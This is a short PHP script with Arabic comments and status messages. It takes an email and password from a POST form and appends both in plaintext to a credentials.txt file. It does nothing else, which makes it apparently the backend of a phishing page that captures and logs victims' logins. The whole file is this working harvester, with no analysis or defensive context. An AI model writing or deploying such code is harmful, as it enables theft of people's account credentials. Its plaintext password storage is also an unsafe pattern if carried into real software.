<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!empty($email) && !empty($password)) {
        $file = 'credentials.txt'; // ملف لتخزين البيانات
        $data = "Email: $email | Password: $password" . PHP_EOL;
        file_put_contents($file, $data, FILE_APPEND); // حفظ البيانات في الملف
        echo "تم الحفظ بنجاح";
    } else {
        echo "بيانات غير صحيحة";
    }
}
?>